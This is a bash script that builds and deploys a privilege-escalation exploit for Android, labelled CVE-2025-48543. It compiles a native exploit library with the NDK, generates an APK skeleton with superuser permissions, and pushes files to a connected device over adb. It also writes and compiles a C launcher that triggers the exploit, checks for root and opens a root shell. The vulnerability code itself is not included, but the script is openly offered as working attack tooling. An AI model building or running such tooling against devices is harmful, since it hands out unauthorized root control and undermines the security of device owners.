#!/bin/bash

#######################################
# CVE-2025-48543 Android Root Exploit
# Build and Deploy Script
#######################################

echo "======================================="
echo "CVE-2025-48543 Android Root Exploit"
echo "Build & Deploy Script"
echo "======================================="
echo ""

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Check for required tools
check_requirements() {
    echo -e "${YELLOW}[*] Checking requirements...${NC}"
    
    # Check for Android NDK
    if [ -z "$ANDROID_NDK_HOME" ]; then
        echo -e "${RED}[!] ANDROID_NDK_HOME not set${NC}"
        echo "Please set ANDROID_NDK_HOME to your NDK installation path"
        exit 1
    fi
    
    # Check for ADB
    if ! command -v adb &> /dev/null; then
        echo -e "${RED}[!] ADB not found${NC}"
        echo "Please install Android SDK and ensure adb is in PATH"
        exit 1
    fi
    
    echo -e "${GREEN}[+] Requirements satisfied${NC}"
}

# Build native library
build_native() {
    echo -e "${YELLOW}[*] Building native exploit library...${NC}"
    
    # Create jni directory
    mkdir -p jni
    cp android_root_exploit.cpp jni/
    cp Android.mk jni/
    
    # Build using ndk-build
    $ANDROID_NDK_HOME/ndk-build
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] Native library built successfully${NC}"
    else
        echo -e "${RED}[!] Build failed${NC}"
        exit 1
    fi
}

# Create APK
create_apk() {
    echo -e "${YELLOW}[*] Creating Android APK...${NC}"
    
    # Create directory structure
    mkdir -p app/src/main/java/com/android/exploit
    mkdir -p app/src/main/jniLibs/arm64-v8a
    mkdir -p app/src/main/jniLibs/armeabi-v7a
    mkdir -p app/src/main/res/values
    
    # Copy files
    cp RootExploit.java app/src/main/java/com/android/exploit/
    cp libs/arm64-v8a/libandroid_root_exploit.so app/src/main/jniLibs/arm64-v8a/ 2>/dev/null
    cp libs/armeabi-v7a/libandroid_root_exploit.so app/src/main/jniLibs/armeabi-v7a/ 2>/dev/null
    
    # Create AndroidManifest.xml
    cat > app/src/main/AndroidManifest.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.android.exploit">
    
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_SUPERUSER" />
    
    <application
        android:label="Root Exploit"
        android:debuggable="true">
        <activity android:name=".RootExploit"
                  android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
EOF
    
    # Create build.gradle
    cat > app/build.gradle << EOF
apply plugin: 'com.android.application'

android {
    compileSdkVersion 34
    buildToolsVersion "34.0.0"
    
    defaultConfig {
        applicationId "com.android.exploit"
        minSdkVersion 33  // Android 13
        targetSdkVersion 34
        versionCode 1
        versionName "1.0"
    }
    
    buildTypes {
        debug {
            minifyEnabled false
        }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
}
EOF
    
    echo -e "${GREEN}[+] APK structure created${NC}"
}

# Deploy to device
deploy_to_device() {
    echo -e "${YELLOW}[*] Deploying to device...${NC}"
    
    # Check if device is connected
    if ! adb devices | grep -q "device$"; then
        echo -e "${RED}[!] No device connected${NC}"
        echo "Please connect your Android device with USB debugging enabled"
        exit 1
    fi
    
    # Push exploit files
    echo -e "${YELLOW}[*] Pushing exploit to device...${NC}"
    
    # Push the native library
    adb push libs/arm64-v8a/libandroid_root_exploit.so /data/local/tmp/ 2>/dev/null
    adb push libs/armeabi-v7a/libandroid_root_exploit.so /data/local/tmp/ 2>/dev/null
    
    # Create and push a simple test executable
    cat > exploit_test.c << EOF
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

int main() {
    printf("[*] CVE-2025-48543 Exploit Test\n");
    printf("[*] Current UID: %d\n", getuid());
    
    void* handle = dlopen("/data/local/tmp/libandroid_root_exploit.so", RTLD_NOW);
    if (!handle) {
        printf("[!] Failed to load exploit library\n");
        return 1;
    }
    
    printf("[+] Library loaded, triggering exploit...\n");
    
    // Trigger the exploit
    void (*trigger)() = dlsym(handle, "Java_com_android_exploit_RootExploit_triggerExploit");
    if (trigger) {
        trigger();
    }
    
    printf("[*] Final UID: %d\n", getuid());
    
    if (getuid() == 0) {
        printf("[!!!] ROOT ACCESS ACHIEVED!\n");
        printf("[*] Spawning root shell...\n");
        system("/system/bin/sh");
    }
    
    return 0;
}
EOF
    
    # Compile test executable
    $ANDROID_NDK_HOME/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android33-clang \
        -o exploit_test exploit_test.c -ldl
    
    # Push and execute
    adb push exploit_test /data/local/tmp/
    adb shell chmod +x /data/local/tmp/exploit_test
    
    echo -e "${GREEN}[+] Exploit deployed${NC}"
}

# Run exploit
run_exploit() {
    echo -e "${YELLOW}[*] Running exploit on device...${NC}"
    echo -e "${RED}[!] WARNING: This will attempt to root your device${NC}"
    read -p "Continue? (y/n): " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        adb shell /data/local/tmp/exploit_test
    fi
}

# Main execution
main() {
    check_requirements
    build_native
    create_apk
    deploy_to_device
    
    echo ""
    echo -e "${GREEN}=======================================${NC}"
    echo -e "${GREEN}[+] Build and deploy completed!${NC}"
    echo -e "${GREEN}=======================================${NC}"
    echo ""
    echo "To run the exploit:"
    echo "  1. Manual: adb shell /data/local/tmp/exploit_test"
    echo "  2. Automatic: ./build_and_deploy.sh --run"
    echo ""
    
    # Check if --run flag is provided
    if [ "$1" == "--run" ]; then
        run_exploit
    fi
}

# Execute main function
main $@